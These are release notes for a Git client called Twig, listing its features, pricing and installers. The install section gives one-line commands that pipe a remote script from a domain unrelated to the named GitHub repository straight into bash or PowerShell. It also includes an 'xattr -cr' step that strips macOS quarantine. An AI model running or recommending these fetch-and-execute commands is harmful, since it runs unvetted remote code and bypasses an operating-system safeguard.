# Twig release notes

Newest first. Downloads: https://github.com/JKS-sys/twig-08-oct-2026-releases/releases/latest · https://ipconfig.co.network/twig

## Twig 1.0.0 — 08 Oct 2026

The first release of Twig — a tiny, fast Git client for macOS, Windows and Linux (08 Oct 2026).

- **Commit graph** with branch lanes, tags, and search by message and author.
- **Changes view** with hunk and single-line staging, unstaging and discard, and a commit box with amend.
- **Branches, tags and remotes**: create, rename, check out, delete; fetch, pull and push with progress.
- **Stash manager**: save (with message, untracked), apply, pop, preview and drop.
- **Interactive rebase**: reorder, squash, fixup, reword and drop commits.
- **Cherry-pick, revert and reset** (soft, mixed, hard) from any commit.
- **Blame and file history** for any file.
- **Conflict resolver**: ours, theirs or both per conflict, then mark resolved and continue.
- **Insights**: contribution heatmap, busiest days and hours, top contributors and streaks.
- **Clone and init** from a URL or an empty folder.
- **Multi-repo tabs** and a **command palette** for every action.
- **Synthesized sound effects** (Web Audio, no files) with one mute toggle; short animations that respect “reduce motion”.
- **Light and dark themes** that follow the system.
- **Twig Pro**: ₹20 / month or ₹220 / year through Razorpay, or an activation code; Pro re-checks itself at launch.
- **Self-updates** on all three platforms, signed with the Twig updater key.
- **Crash reports** you review before anything is sent.
- Installers: macOS DMG (Apple silicon and Intel), Windows setup, Linux AppImage and .deb; one-line installers for each.

### Install

- **macOS** (Apple silicon and Intel): `curl -fsSL https://ipconfig.co.network/updates/twig/install.sh | bash`
- **Windows** (PowerShell): `irm https://ipconfig.co.network/updates/twig/install.ps1 | iex`
- **Linux** (AppImage): `curl -fsSL https://ipconfig.co.network/updates/twig/install.sh | bash` — add `-s -- --deb` for the .deb

First launch on macOS after a manual DMG install: `xattr -cr /Applications/Twig.app` (Twig is ad-hoc signed, not notarized).
